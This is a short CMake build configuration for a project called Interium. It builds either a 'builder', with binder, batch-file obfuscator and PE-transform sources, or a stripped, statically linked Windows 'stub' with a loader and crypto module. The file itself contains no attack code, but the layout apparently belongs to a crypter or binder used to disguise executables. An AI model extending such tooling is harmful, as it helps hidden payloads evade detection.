cmake_minimum_required(VERSION 3.16)
project(Interium VERSION 3.0.0 LANGUAGES C CXX)

set(CMAKE_C_STANDARD 11)
set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

option(BUILD_STUB "Build the Windows stub instead of the builder" OFF)

if(BUILD_STUB)
    if(NOT MSVC)
        set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} -static -static-libgcc -static-libstdc++ -s")
    endif()
    add_executable(stub WIN32
        src/stub/main.cpp
        src/stub/loader.cpp
        src/common/crypto.cpp
    )
    target_include_directories(stub PRIVATE ${CMAKE_SOURCE_DIR}/include)
    if(MSVC)
        target_link_libraries(stub PRIVATE advapi32 kernel32)
    else()
        target_link_libraries(stub PRIVATE -ladvapi32 -lkernel32)
    endif()
else()
    add_executable(interium
        src/builder/main.cpp
        src/builder/binder.cpp
        src/builder/bat_obfuscator.cpp
        src/pe.cpp
        src/transforms.cpp
    )
    target_include_directories(interium PRIVATE ${CMAKE_SOURCE_DIR}/include)
    if(MSVC)
        target_compile_options(interium PRIVATE /W3 /O2)
    endif()
endif()
